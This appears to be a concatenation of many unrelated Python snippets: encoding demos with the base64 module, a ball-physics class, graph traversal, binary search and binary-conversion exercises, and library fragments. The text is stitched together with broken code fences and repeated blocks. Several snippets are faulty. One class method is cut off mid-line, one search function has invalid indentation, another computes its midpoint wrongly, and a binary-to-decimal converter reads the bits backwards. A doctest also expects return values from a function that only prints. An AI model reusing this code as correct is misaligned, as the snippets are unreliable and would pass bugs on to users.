        super(BallObject, self).__init__(*args, **kwargs)
        self.color = (255, 180, 0)
        self.velocity_x, self.velocity_y = 0.0, 0.0

    def update(self, win_size: Tuple, border: Tuple, other_object, dt) -> None:
        speed = [
            2.37,
            2.49,
            2.54,
            2.62,
            2.71,
            2.85,
            2.96,
            3.08,
            3.17,
            3.25,
        ]  # more choices more randomness
        rn = random.choice(speed)
        newx = self.x + self.velocity_x
        newy = self.y + self.velocity_y

        if newx < border + self.radius or newx > win_size[0] - border - self.radius:
            self.velocity_x = -(self.velocity_x / abs(self.velocity_x)) * rn
        elif newy > win_size[1] - border - self.radius:
            self.velocity_y = -(self.velocity_y / abs(self.velocity_y)) * rn
        elif (newy - self.radius < other_object.height) and (
            other_object.x <= newx <= other_object.rightx
        ):
            self.velocity_y = -(self.velocity_y / abs(self.velocity_y)) * rn
        else:
            self.x = newx
            self.y = newy

from __future__ import absolute_import, division, unicode_literals


class Filter(object):
    def __init__(self, source):
        self.source = source

    def __iter__(self):
        return iter(self.source)

    def __getattr__(self, name):
        return getattr(self.source, name)

import base64


def encode_to_b16(inp: str) -> bytes:
    """
    Encodes a given utf-8 string into base-16.
    >>> encode_to_b16('Hello World!')
    b'48656C6C6F20576F726C6421'
    >>> encode_to_b16('HELLO WORLD!')
    b'48454C4C4F20574F524C4421'
    >>> encode_to_b16('')
    b''
    """
    encoded = inp.encode("utf-8")  # encoded the input (we need a bytes like object)
    b16encoded = base64.b16encode(encoded)  # b16encoded the encoded string
    return b16encoded


if __name__ == "__main__":
    import doctest

    doctest.testmod()

import base64


def main() -> None:
    inp = input("->")
    encoded = inp.encode("utf-8")  # encoded the input (we need a bytes like object)
    b32encoded = base64.b32encode(encoded)  # b32encoded the encoded string
    print(b32encoded)
    print(base64.b32decode(b32encoded).decode("utf-8"))  # decoded it


if __name__ == "__main__":
    main()

```









---


```py


# end_pymotw_header
import base64

encoded_data = b"VGhpcyBpcyB0aGUgZGF0YSwgaW4gdGhlIGNsZWFyLg=="
decoded_data = base64.b64decode(encoded_data)
print("Encoded :", encoded_data)
print("Decoded :", decoded_data)

```









---


```py


# end_pymotw_header
import base64
import textwrap

# Load this source file and strip the header.
with open(__file__, "r", encoding="utf-8") as input:
    raw = input.read()
    initial_data = raw.split("#end_pymotw_header")[1]

byte_string = initial_data.encode("utf-8")
encoded_data = base64.b64encode(byte_string)

num_initial = len(byte_string)

# There will never be more than 2 padding bytes.
padding = 3 - (num_initial % 3)

print("{} bytes before encoding".format(num_initial))
print("Expect {} padding bytes".format(padding))
print("{} bytes after encoding\n".format(len(encoded_data)))
print(encoded_data)

```









---


```py


# end_pymotw_header
import base64

original_data = b"This is the data, in the clear."
print("Original:", original_data)

encoded_data = base64.b16encode(original_data)
print("Encoded :", encoded_data)

decoded_data = base64.b16decode(encoded_data)
print("Decoded :", decoded_data)

```









---


```py


# end_pymotw_header
import base64

original_data = b"This is the data, in the clear."
print("Original:", original_data)

encoded_data = base64.b32encode(original_data)
print("Encoded :", encoded_data)

decoded_data = base64.b32decode(encoded_data)
print("Decoded :", decoded_data)

#```


```pyDemonstrates base85 and ascii85 encodings.

http://bugs.python.org/17618```


```py

# end_pymotw_header
import base64

original_data = b"This is the data, in the clear."
print("Original    : {} bytes {!r}".format(len(original_data), original_data))

b64_data = base64.b64encode(original_data)
print("b64 Encoded : {} bytes {!r}".format(len(b64_data), b64_data))

b85_data = base64.b85encode(original_data)
print("b85 Encoded : {} bytes {!r}".format(len(b85_data), b85_data))

a85_data = base64.a85encode(original_data)
print("a85 Encoded : {} bytes {!r}".format(len(a85_data), a85_data))

```









---


```py


# end_pymotw_header
import base64

encodes_with_pluses = b"\xfb\xef"
encodes_with_slashes = b"\xff\xff"

for original in [encodes_with_pluses, encodes_with_slashes]:
    print("Original         :", repr(original))
    print("Standard encoding:", base64.standard_b64encode(original))
    print("URL-safe encoding:", base64.urlsafe_b64encode(original))
    print()

import base64


def main() -> None:
    inp = input("->")
    encoded = inp.encode("utf-8")  # encoded the input (we need a bytes like object)
    a85encoded = base64.a85encode(encoded)  # a85encoded the encoded string
    print(a85encoded)
    print(base64.a85decode(a85encoded).decode("utf-8"))  # decoded it


if __name__ == "__main__":
    main()

import numpy as np
import matplotlib.pyplot as plt


plt.rcParams["font.family"] = "MEIRYO"
plt.rcParams["font.size"] = 18

w, h, dpi = 1920, 1080, 144
fig = plt.figure(figsize=(w / dpi, h / dpi), dpi=dpi, facecolor="white")

x = np.arange(-0.2, 7, 0.001)
y1 = 3 * np.sin(x)
y2 = 2.3 * np.sin(x)
plt.xticks(np.linspace(0, np.pi * 2.5, num=6, endpoint=True))
plt.yticks(np.linspace(-11, 11, num=23, endpoint=True))

plt.grid(True)

plt.plot(x, y1, label="電流")
plt.plot(x, y2, label="両端電圧")

plt.legend()
plt.legend(bbox_to_anchor=(1, 1), loc="upper right", borderaxespad=1)

plt.show()

class BaseJobResource(Resource):
    def dispatch_request(
        self,
        provider: str,
        owner_name: str,
        repo_name: str,
        build_number: int,
        job_number: int,
        *args,
        **kwargs
    ) -> Response:
        queryset = (
            Job.query.join(Build, Build.id == Job.build_id)
            .join(Repository, Repository.id == Build.repository_id)
            .filter(
                Repository.provider == RepositoryProvider(provider),
                Repository.owner_name == owner_name,
                Repository.name == repo_name,
                Build.number == build_number,
                Job.number == job_number,
            )
        )
        if self.is_mutation():
            queryset = queryset.with_for_update()
        job = queryset.first()
        if not job:
            return self.not_found()

        return Resource.dispatch_request(self, job, *args, **kwargs)

# -*- coding: utf-8 -*-
#
# :copyright: (c) 2020 by Pavlo Dmytrenko.
# :license: MIT, see LICENSE for more details.
````

````py
yaspin.base_spinner
~~~~~~~~~~~~~~~~~~~

Spinner class, used to construct other spinners.```


```py

from __future__ import absolute_import

from collections import namedtuple


Spinner = namedtuple("Spinner", "frames interval")
default_spinner = Spinner("⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 80)

from fpdf import FPDF

# Author: @NavonilDas


pdf = FPDF()
# Set Author Name of the PDF
pdf.set_author("@NavonilDas")
# Set Subject of The PDF
pdf.set_subject("python")
# Set the Title of the PDF
pdf.set_title("Generating PDF with Python")
pdf.add_page()

# Set Font family Courier with font size 28
pdf.set_font("Courier", "", 18)
# Add Text at (0,50)
pdf.text(0, 50, "Example to generate PDF in python.")

# Set Font Family Courier with italic and font size 28
pdf.set_font("Courier", "i", 28)
pdf.text(0, 60, "This is an italic text")  # Write text at 0,60

# Draw a Rectangle at (10,100) with Width 60,30
pdf.rect(10, 100, 60, 30, "D")

# Set Fill color
pdf.set_fill_color(255, 0, 0)  # Red = (255,0,0)

# Draw a Circle at (10,135) with diameter 50
pdf.ellipse(10, 135, 50, 50, "F")

# Save the Output at Local File
pdf.output("output.pdf", "F")

# Example: Kilometers to Miles

# Taking kilometers input from the user
kilometers = float(input("Enter value in kilometers: "))

# conversion factor
conv_fac = 0.621371

# calculate miles
miles = kilometers * conv_fac
print("%0.2f kilometers is equal to %0.2f miles" % (kilometers, miles))

def findSum(N, S):
    result = []
    find(N, S, [], result)
    return result


def find(N, S, path, result):
    if N <= 0:
        return
    if S < 0:
        return
    for i in range(21):
        if i == S:
            path.append(i)
            while N > 0:
                path.append(0)
                N -= 1
            result.append(path)
        else:
            find(N - 1, S - i, path + [i], result)


result = findSum(5, 3)

import distutils.command.bdist_rpm as orig


class bdist_rpm(orig.bdist_rpm):
    """
    Override the default bdist_rpm behavior to do the following:

    1. Run egg_info to ensure the name and version are properly calculated.
    2. Always run 'install' using --single-version-externally-managed to
       disable eggs in RPM distributions.
    """

    def run(self):
        # ensure distro name is up-to-date
        self.run_command("egg_info")

        orig.bdist_rpm.run(self)

    def _make_spec_file(self):
        spec = orig.bdist_rpm._make_spec_file(self)
        spec = [
            line.replace(
                "setup.py install ",
                "setup.py install --single-version-externally-managed ",
            ).replace("%setup", "%setup -n %{name}-%{unmangled_version}")
            for line in spec
        ]
        return spec
````

````py
Bead sort only works for sequences of nonegative integers.
https://en.wikipedia.org/wiki/Bead_sort```


```py


def bead_sort(sequence: list) -> list:
    """
    >>> bead_sort([6, 11, 12, 4, 1, 5])
    [1, 4, 5, 6, 11, 12]

    >>> bead_sort([9, 8, 7, 6, 5, 4 ,3, 2, 1])
    [1, 2, 3, 4, 5, 6, 7, 8, 9]

    >>> bead_sort([5, 0, 4, 3])
    [0, 3, 4, 5]

    >>> bead_sort([8, 2, 1])
    [1, 2, 8]

    >>> bead_sort([1, .9, 0.0, 0, -1, -.9])
    Traceback (most recent call last):
    ...
    TypeError: Sequence must be list of nonnegative integers

    >>> bead_sort("Hello world")
    Traceback (most recent call last):
    ...
    TypeError: Sequence must be list of nonnegative integers
    """
    if any(not isinstance(x, int) or x < 0 for x in sequence):
        raise TypeError("Sequence must be list of nonnegative integers")
    for _ in range(len(sequence)):
        for i, (rod_upper, rod_lower) in enumerate(zip(sequence, sequence[1:])):
            if rod_upper > rod_lower:
                sequence[i] -= rod_upper - rod_lower
                sequence[i + 1] += rod_upper - rod_lower
    return sequence


if __name__ == "__main__":
    assert bead_sort([5, 4, 3, 2, 1]) == [1, 2, 3, 4, 5]
    assert bead_sort([7, 9, 4, 3, 5]) == [3, 4, 5, 7, 9]

# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import typing

from pip._vendor.tenacity import _utils

if typing.TYPE_CHECKING:
    import logging

    from pip._vendor.tenacity import RetryCallState


def before_nothing(retry_state: "RetryCallState") -> None:
    """Before call strategy that does nothing."""


def before_log(
    logger: "logging.Logger", log_level: int
) -> typing.Callable[["RetryCallState"], None]:
    """Before call strategy that logs to some logger the attempt."""

    def log_it(retry_state: "RetryCallState") -> None:
        logger.log(
            log_level,
            f"Starting call to '{_utils.get_callback_name(retry_state.fn)}', "
            f"this is the {_utils.to_ordinal(retry_state.attempt_number)} time calling it.",
        )

    return log_it

def bellman_ford(graph, source):
    weight = {}
    pre_node = {}

    initialize_single_source(graph, source, weight, pre_node)

    for i in range(1, len(graph)):
        for node in graph:
            for adjacent in graph[node]:
                if weight[adjacent] > weight[node] + graph[node][adjacent]:
                    weight[adjacent] = weight[node] + graph[node][adjacent]
                    pre_node[adjacent] = node

    for node in graph:
        for adjacent in graph[node]:
            if weight[adjacent] > weight[node] + graph[node][adjacent]:
                return False

    return True


def initialize_single_source(graph, source, weight, pre_node):

    for node in graph:
        weight[node] = float("inf")
        pre_node[node] = None

    weight[source] = 0
````

`````py
Even more features than `tqdm.auto` (all the bells & whistles):

- `tqdm.auto`
- `tqdm.tqdm.pandas`
- `tqdm.contrib.telegram`
    + uses `${TQDM_TELEGRAM_TOKEN}` and `${TQDM_TELEGRAM_CHAT_ID}`
- `tqdm.contrib.discord`
    + uses `${TQDM_DISCORD_TOKEN}` and `${TQDM_DISCORD_CHANNEL_ID}````


```py
__all__ = ["tqdm", "trange"]
import warnings
from os import getenv

if getenv("TQDM_TELEGRAM_TOKEN") and getenv("TQDM_TELEGRAM_CHAT_ID"):
    from .telegram import tqdm, trange
elif getenv("TQDM_DISCORD_TOKEN") and getenv("TQDM_DISCORD_CHANNEL_ID"):
    from .discord import tqdm, trange
else:
    from ..auto import tqdm, trange

with warnings.catch_warnings():
    warnings.simplefilter("ignore", category=FutureWarning)
    tqdm.pandas()

def bfs(g, N):
    queue = []
    visited = [False] * (N)
    bfs = []
    queue.append(0)
    visited[0] = True
    while queue:
        cur = queue.pop(0)
        bfs.append(cur)
        for neighbour in g[cur]:
            if not visited[neighbour]:
                queue.append(neighbour)
                visited[neighbour] = True
    return bfs
`````

````py
ID: de877076-d103-430f-946c-08a82aa6a576
https://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/```


```py
from collections import deque
from collections.abc import Iterable, Mapping

from src.typehints import Node


def bfs_paths_dict(
    graph: Mapping[Node, set[Node]], start: Node, goal: Node
) -> Iterable[list[Node]]:
    """Find all the paths from start to goal using BFS on a dict."""
    to_visit = deque([[start]])
    while to_visit:
        path = to_visit.popleft()
        node = path[-1]
        if node == goal:
            yield path
        else:
            for next_node in graph[node].difference(path):
                to_visit.append(path + [next_node])
````

````py
ID: de877076-d103-430f-946c-08a82aa6a576
https://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/```


```py
from collections import deque
from collections.abc import Iterable, Mapping

from src.typehints import Node


def bfs_paths_dict(
    graph: Mapping[Node, set[Node]], start: Node, goal: Node
) -> Iterable[list[Node]]:
    """Find all the paths from start to goal using BFS on a dict."""
    to_visit = deque([[start]])
    while to_visit:
        path = to_visit.popleft()
        node = path[-1]
        if node == goal:
            yield path
        else:
            for next_node in graph[node].difference(path):
                to_visit.append(path + [next_node])
````

````py
ID: de877076-d103-430f-946c-08a82aa6a576
https://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/```


```py
from collections import deque
from collections.abc import Iterable, Mapping

from src.typehints import Node


def bfs_paths_dict(
    graph: Mapping[Node, set[Node]], start: Node, goal: Node
) -> Iterable[list[Node]]:
    """Find all the paths from start to goal using BFS on a dict."""
    to_visit = deque([[start]])
    while to_visit:
        path = to_visit.popleft()
        node = path[-1]
        if node == goal:
            yield path
        else:
            for next_node in graph[node].difference(path):
                to_visit.append(path + [next_node])
````

````py
ID: fe10d17f-e7f8-40f7-8b78-fd799cf7d4b3
Grokking Algorithms, Page 95```


```py
from collections import deque
from collections.abc import Callable, Iterable, Mapping

from src.typehints import Node


def bfs_search_dict(
    graph: Mapping[Node, Iterable[Node]], start: Node, predicate: Callable[[Node], bool]
) -> bool:
    """Find the closest node to start that matches the predicate using breadth first search."""
    visited = set()
    to_visit = deque([start])
    while to_visit:
        node = to_visit.popleft()
        if node in visited:
            continue
        visited.add(node)
        if predicate(node):
            return True
        to_visit += graph[node]
    return False
````

````py
ID: fe10d17f-e7f8-40f7-8b78-fd799cf7d4b3
Grokking Algorithms, Page 95```


```py
from collections import deque
from collections.abc import Callable, Iterable, Mapping

from src.typehints import Node


def bfs_search_dict(
    graph: Mapping[Node, Iterable[Node]], start: Node, predicate: Callable[[Node], bool]
) -> bool:
    """Find the closest node to start that matches the predicate using breadth first search."""
    visited = set()
    to_visit = deque([start])
    while to_visit:
        node = to_visit.popleft()
        if node in visited:
            continue
        visited.add(node)
        if predicate(node):
            return True
        to_visit += graph[node]
    return False
````

````py
ID: b2d4ac17-3a7f-478f-8949-da86687be458```


```py
from collections import deque
from collections.abc import Sequence


def bfs_search_grid(
    grid: Sequence[Sequence[int]], start: tuple[int, int], goal: tuple[int, int]
) -> bool:
    """On a grid of 0s and 1s, find if start is connected to goal via a path of 1s."""
    rows = range(len(grid))
    cols = range(len(grid[0]))
    seen = {start}
    to_visit = deque([start])
    while to_visit:
        r, c = to_visit.popleft()
        if (r, c) == goal:
            return True
        adjacent = {(r + 1, c), (r - 1, c), (r, c + 1), (r, c - 1)}
        for next_node in adjacent - seen:
            r1, c1 = next_node
            # Using these range objects is a concise alternative to 0 <= r1 < len(graph) and 0 <= c1 < len(graph[0])
            if r1 in rows and c1 in cols and grid[r1][c1]:
                seen.add(next_node)
                to_visit.append(next_node)
    return False
````

````py
ID: b2d4ac17-3a7f-478f-8949-da86687be458```


```py
from collections import deque
from collections.abc import Sequence


def bfs_search_grid(
    grid: Sequence[Sequence[int]], start: tuple[int, int], goal: tuple[int, int]
) -> bool:
    """On a grid of 0s and 1s, find if start is connected to goal via a path of 1s."""
    rows = range(len(grid))
    cols = range(len(grid[0]))
    seen = {start}
    to_visit = deque([start])
    while to_visit:
        r, c = to_visit.popleft()
        if (r, c) == goal:
            return True
        adjacent = {(r + 1, c), (r - 1, c), (r, c + 1), (r, c - 1)}
        for next_node in adjacent - seen:
            r1, c1 = next_node
            # Using these range objects is a concise alternative to 0 <= r1 < len(graph) and 0 <= c1 < len(graph[0])
            if r1 in rows and c1 in cols and grid[r1][c1]:
                seen.add(next_node)
                to_visit.append(next_node)
    return False

def csBinaryToASCII(binary):
    string_blocks = (binary[i : i + 8] for i in range(0, len(binary), 8))
    string = "".join(chr(int(char, 2)) for char in string_blocks)
    return string


print(csBinaryToASCII("011011000110000101101101011000100110010001100001"))

def binarySearchAppr(arr, start, end, x):
    # check condition
    if end >= start:
        mid = start + (end - start)//2
        # If element is present at the middle
        if arr[mid] == x:
        return mid
        # If element is smaller than mid
        elif arr[mid] > x:
        return binarySearchAppr(arr, start, mid-1, x)
        # Else the element greator than mid
        else:
        return binarySearchAppr(arr, mid+1, end, x)
    else:
        # Element is not found in the array
        return -1


arr = sorted(['t', 'u', 't', 'o', 'r', 'i', 'a', 'l'])
x = 'r'
result = binarySearchAppr(arr, 0, len(arr)-1, x)
if result != -1:
    print("Element is present at index "+str(result))
else:
    print("Element is not present in array")

# Source : https://leetcode.com/problems/binary-tree-tilt/description/

# Date   : 2017-12-26

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def findTilt(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """
        global ans
        ans = 0
        self.sumOfNode(root)
        return ans

    def sumOfNode(self, root):
        if root == None:
            return 0

        left = self.sumOfNode(root.left)
        right = self.sumOfNode(root.right)

        global ans
        ans += abs(left - right)
        return left + right + root.val

# -*- coding: utf-8 -*-```


```pybinarySearch.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1G55ggF-ZXJhSC5jnCzKbNtQt0J_615nd```


```py


def binarySearch(A, l, r, x):
    if r >= l:
        mid = int((l + (r - 1)) / 2)
        if A[mid] == x:
            return mid
        elif A[mid] > x:
            r = mid - 1
            return binarySearch(A, l, r, x)
        else:
            l = mid + 1
            return binarySearch(A, l, r, x)


A = [1, 2, 3, 4, 5, 6, 7, 8, 9]
print(binarySearch(A, 0, len(A) - 1, 8))

# Given a binary string (ASCII encoded), write a function that returns the equivalent decoded text.

# Every eight bits in the binary string represents one character on the ASCII table.

# Examples:

# csBinaryToASCII("011011000110000101101101011000100110010001100001") -> "lambda"
# 01101100 -> 108 -> "l"
# 01100001 -> 97 -> "a"
# 01101101 -> 109 -> "m"
# 01100010 -> 98 -> "b"
# 01100100 -> 100 -> "d"
# 01100001 -> 97 -> "a"
# csBinaryToASCII("") -> ""
# Notes:

# The input string will always be a valid binary string.
# Characters can be in the range from "00000000" to "11111111" (inclusive).
# In the case of an empty input string, your function should return an empty string.
# [execution time limit] 4 seconds (py3)

# [input] string binary

# [output] string


def csBinaryToASCII(binary):
    binary_letters = []
    letters = ""
    if binary == "":
        return ""
    for index in range(0, len(binary), 8):
        binary_letters.append(binary[index : index + 8])
    print(binary_letters)
    for string in binary_letters:
        binary_int = v = chr(int(string, 2))
        print(binary_int)
        letters += binary_int
    return letters

class Node:

    def __init__(self, data):
        self.left = None
        self.right = None
        self.data = data

    def insert(self, data):
        # Checks if node exists
        if self.data:
            if data <

def binary_count_setbits(a: int) -> int:
    """
    Take in 1 integer, return a number that is
    the number of 1's in binary representation of that number.

    >>> binary_count_setbits(25)
    3
    >>> binary_count_setbits(36)
    2
    >>> binary_count_setbits(16)
    1
    >>> binary_count_setbits(58)
    4
    >>> binary_count_setbits(4294967295)
    32
    >>> binary_count_setbits(0)
    0
    >>> binary_count_setbits(-10)
    Traceback (most recent call last):
        ...
    ValueError: Input value must be a positive integer
    >>> binary_count_setbits(0.8)
    Traceback (most recent call last):
        ...
    TypeError: Input value must be a 'int' type
    >>> binary_count_setbits("0")
    Traceback (most recent call last):
        ...
    TypeError: '<' not supported between instances of 'str' and 'int'
    """
    if a < 0:
        raise ValueError("Input value must be a positive integer")
    elif isinstance(a, float):
        raise TypeError("Input value must be a 'int' type")
    return bin(a).count("1")


if __name__ == "__main__":
    import doctest

    doctest.testmod()

from math import log2


def binary_count_trailing_zeros(a: int) -> int:
    """
    Take in 1 integer, return a number that is
    the number of trailing zeros in binary representation of that number.

    >>> binary_count_trailing_zeros(25)
    0
    >>> binary_count_trailing_zeros(36)
    2
    >>> binary_count_trailing_zeros(16)
    4
    >>> binary_count_trailing_zeros(58)
    1
    >>> binary_count_trailing_zeros(4294967296)
    32
    >>> binary_count_trailing_zeros(0)
    0
    >>> binary_count_trailing_zeros(-10)
    Traceback (most recent call last):
        ...
    ValueError: Input value must be a positive integer
    >>> binary_count_trailing_zeros(0.8)
    Traceback (most recent call last):
        ...
    TypeError: Input value must be a 'int' type
    >>> binary_count_trailing_zeros("0")
    Traceback (most recent call last):
        ...
    TypeError: '<' not supported between instances of 'str' and 'int'
    """
    if a < 0:
        raise ValueError("Input value must be a positive integer")
    elif isinstance(a, float):
        raise TypeError("Input value must be a 'int' type")
    return 0 if (a == 0) else int(log2(a & -a))


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def bin_exp_mod(a, n, b):
    """
    >>> bin_exp_mod(3, 4, 5)
    1
    >>> bin_exp_mod(7, 13, 10)
    7
    """
    # mod b
    assert not (b == 0), "This cannot accept modulo that is == 0"
    if n == 0:
        return 1

    if n % 2 == 1:
        return (bin_exp_mod(a, n - 1, b) * a) % b

    r = bin_exp_mod(a, n / 2, b)
    return (r * r) % b


if __name__ == "__main__":
    try:
        BASE = int(input("Enter Base : ").strip())
        POWER = int(input("Enter Power : ").strip())
        MODULO = int(input("Enter Modulo : ").strip())
    except ValueError:
        print("Invalid literal for integer")

    print(bin_exp_mod(BASE, POWER, MODULO))
````

```pyBinary Exponentiation."""

# Author : Junth Basnet
# Time Complexity : O(logn)


def binary_exponentiation(a, n):

    if n == 0:
        return 1

    elif n % 2 == 1:
        return binary_exponentiation(a, n - 1) * a

    else:
        b = binary_exponentiation(a, n / 2)
        return b * b


if __name__ == "__main__":
    try:
        BASE = int(input("Enter Base : ").strip())
        POWER = int(input("Enter Power : ").strip())
    except ValueError:
        print("Invalid literal for integer")

    RESULT = binary_exponentiation(BASE, POWER)
    print(f"{BASE}^({POWER}) : {RESULT}")
```

````py
* Binary Exponentiation with Multiplication
* This is a method to find a*b in a time complexity of O(log b)
* This is one of the most commonly used methods of finding result of multiplication.
* Also useful in cases where solution to (a*b)%c is required,
* where a,b,c can be numbers over the computers calculation limits.
* Done using iteration, can also be done using recursion

* @author chinmoy159
* @version 1.0 dated 10/08/2017```


```py


def b_expo(a, b):
    res = 0
    while b > 0:
        if b & 1:
            res += a

        a += a
        b >>= 1

    return res


def b_expo_mod(a, b, c):
    res = 0
    while b > 0:
        if b & 1:
            res = ((res % c) + (a % c)) % c

        a += a
        b >>= 1

    return res

````

````py
* Wondering how this method works !
* It's pretty simple.
* Let's say you need to calculate a ^ b
* RULE 1 : a * b = (a+a) * (b/2) ---- example : 4 * 4 = (4+4) * (4/2) = 8 * 2
* RULE 2 : IF b is ODD, then ---- a * b = a + (a * (b - 1)) :: where (b - 1) is even.
* Once b is even, repeat the process to get a * b
* Repeat the process till b = 1 OR b = 0, because a*1 = a AND a*0 = 0
*
* As far as the modulo is concerned,
* the fact : (a+b) % c = ((a%c) + (b%c)) % c
* Now apply RULE 1 OR 2, whichever is required.```


```py
````

````py
* Binary Exponentiation for Powers
* This is a method to find a^b in a time complexity of O(log b)
* This is one of the most commonly used methods of finding powers.
* Also useful in cases where solution to (a^b)%c is required,
* where a,b,c can be numbers over the computers calculation limits.
* Done using iteration, can also be done using recursion

* @author chinmoy159
* @version 1.0 dated 10/08/2017```


```py


def b_expo(a, b):
    res = 1
    while b > 0:
        if b & 1:
            res *= a

        a *= a
        b >>= 1

    return res


def b_expo_mod(a, b, c):
    res = 1
    while b > 0:
        if b & 1:
            res = ((res % c) * (a % c)) % c

        a *= a
        b >>= 1

    return res

````

````py
* Wondering how this method works !
* It's pretty simple.
* Let's say you need to calculate a ^ b
* RULE 1 : a ^ b = (a*a) ^ (b/2) ---- example : 4 ^ 4 = (4*4) ^ (4/2) = 16 ^ 2
* RULE 2 : IF b is ODD, then ---- a ^ b = a * (a ^ (b - 1)) :: where (b - 1) is even.
* Once b is even, repeat the process to get a ^ b
* Repeat the process till b = 1 OR b = 0, because a^1 = a AND a^0 = 1
*
* As far as the modulo is concerned,
* the fact : (a*b) % c = ((a%c) * (b%c)) % c
* Now apply RULE 1 OR 2 whichever is required.```


```py
````

```py
Aim: Given a base-10 integer, n, convert it to binary (base-2). Then find and print the
base-10 integer denoting the maximum number of consecutive 1's in n's binary representation.
```

```py

n = int(input())  # getting input
remainder = []
while n > 0:
    rm = n % 2
    n = (
        n // 2
    )  # whenever decimal to binary conversion is done, the number is repeatedly divided by 2 until it could not be divided any further
    remainder.append(rm)  # appending the remainder that is obtained each time in a list
count, result = 0, 0
for i in range(0, len(remainder)):
    if remainder[i] == 0:
        count = 0  # as soon as '0' is encountered, the counter is set to 0
    else:
        count += 1  # the counter increases every time consecutive ones are encountered
        result = max(result, count)  # maximum streak of 1's is chosen
print(result)
```

```py
Sample Test Case:
Input:
13
Output:
2
Explaination:
The binary representation of 13 is 1101, so the maximum number of consecutive 1's is 2.
```

```py

def binary_search(arr, x):
    start = 0
    end = len(arr) - 1
    mid = 0
    while start <= end:
        mid = (start + end) // 2
        # If x is greater, search in right array
        if arr[mid] < x:
            start = mid + 1

        # If x is smaller, search in left array
        elif arr[mid] > x:
            end = mid - 1
        # if x is present at mid
        else:
            return mid

    # when we reach at the end of array, then the element was not present
    return -1


arr = []
n = int(input("Enter size of array : "))
print("Enter array  elements : ")
for i in range(n):
    e = int(input())
    arr.append(e)
x = int(input("Enter element to search "))
ans = binary_search(arr, x)
if ans == -1:
    print("Element not found")
else:
    print("Element found at ", ans)
```

````py
given a sorted list of integers, recursively find if a given value, val, is in the array or not```


```py


def binarySearch(arr, val):
    # base case when the array is empty
    if len(arr) == 0:
        return False

    # find the mid point of the array
    mid = len(arr) // 2
    if arr[mid] == val:
        return True
    # if the value of the mid point is greater than the val to search for, call the binarySearch fun with the first
    # half of the array
    elif arr[mid] > val:
        return binarySearch(arr[0:mid], val)
    else:
        return binarySearch(arr[mid + 1 :], val)


print(binarySearch([0, 2, 4, 6, 7, 8, 8], 8))  # true
print(binarySearch([0, 2, 4, 6, 7, 8, 8], 1))  # false
print(binarySearch([0, 2, 4, 6, 7, 8, 8], -1))  # false
print(binarySearch([0, 2, 4, 6, 7, 8, 8], 0))  # true

class BinarySearchTree:
    def __init__(self, value):
        self.value = value
        self.left = None
        self.right = None

    def insert(self, value):
        pass

    def contains(self, target):
        pass

    def get_max(self):
        pass

    def for_each(self, cb):
        pass

# Title  : BST using recursive approach
# Author : Frank Faustino
# Date   : 2018-08-15


class BinarySearchTree:
    def __init__(self, value):
        self.value = value
        self.left = None
        self.right = None

    def insert(self, value):
        if value < self.value:
            if self.left is None:
                self.left = BinarySearchTree(value)
            else:
                self.left.insert(value)
        else:
            if self.right is None:
                self.right = BinarySearchTree(value)
            else:
                self.right.insert(value)

    def contains(self, target):
        if target is self.value:
            return True

        if self.left and target < self.value:
            return self.left.contains(target)
        elif self.right and target > self.value:
            return self.right.contains(target)

        return False

    def get_max(self):
        max = self.value
        if self.right and max < self.right.value:
            return self.right.get_max()

        return max

# Program to convert binary to decimal


def binaryToDecimal(binary):
    """
        >>> binaryToDecimal(111110000)
        496
        >>> binaryToDecimal(10100)
        20
        >>> binaryToDecimal(101011)
        43
        """
    decimal, i, n = 0, 0, 0
    while binary != 0:
        dec = binary % 10
        decimal = decimal + dec * pow(2, i)
        binary = binary // 10
        i += 1
    print(decimal)


binaryToDecimal(100)

#!/usr/bin/python
# -*- coding: utf-8 -*-


import sys

# Binary to decimal conversion
# See explaination: https://i.imgur.com/heAT0PB.gif   ,
# https://www.electronics-tutorials.ws/binary/bin_2.html


def binary_to_decimal_conv(binary_string):
    res = 0
    binary_l = list(binary_string)
    for bit_i in range(len(binary_l)):
        res += int(binary_l[bit_i]) * (2 ** bit_i)
    return res


# Test
# Testing interface
i = 0
while True:
    if (
        raw_input("\n[{}] Exit(press e) or Continue(press c): ".format(i))
        .strip()
        .lower()
        == "c"
    ):
        print("Decimal form: " + str(binary_to_decimal_conv(raw_input("\nBinary?: "))))
    else:
        print("\nHope you enjoyed!")
        sys.exit()
    i += 1

#!/usr/bin/python
# -*- coding: utf-8 -*-


import sys

# Binary to decimal conversion
# See explaination: https://i.imgur.com/heAT0PB.gif   ,
# https://www.electronics-tutorials.ws/binary/bin_2.html

# Pesudo code:
# Iterate through binary num
# if 0 then pass
# else result = result + bit(1) * 2 ** index of bit(1)


def binary_to_decimal_conv(binary_string):
    res = 0
    binary_l = list(binary_string)
    for bit_i in range(len(binary_l)):
        res += int(binary_l[bit_i]) * (2 ** bit_i)
    return res


# Test
# Testing interface
i = 0
while True:
    if (
        raw_input("\n[{}] Exit(press e) or Continue(press c): ".format(i))
        .strip()
        .lower()
        == "c"
    ):
        print("Decimal form: " + str(binary_to_decimal_conv(raw_input("\nBinary?: "))))
    else:
        print("\nHope you enjoyed!")
        sys.exit()
    i += 1
````

````py
The function below will convert any binary string to the octal equivalent.

>>> bin_to_octal("1111")
'17'

>>> bin_to_octal("101010101010011")
'52523'

>>> bin_to_octal("")
Traceback (most recent call last):
...
ValueError: Empty string was passed to the function
>>> bin_to_octal("a-1")
Traceback (most recent call last):
...
ValueError: Non-binary value was passed to the function```


```py


def bin_to_octal(bin_string: str) -> str:
    if not all(char in "01" for char in bin_string):
        raise ValueError("Non-binary value was passed to the function")
    if not bin_string:
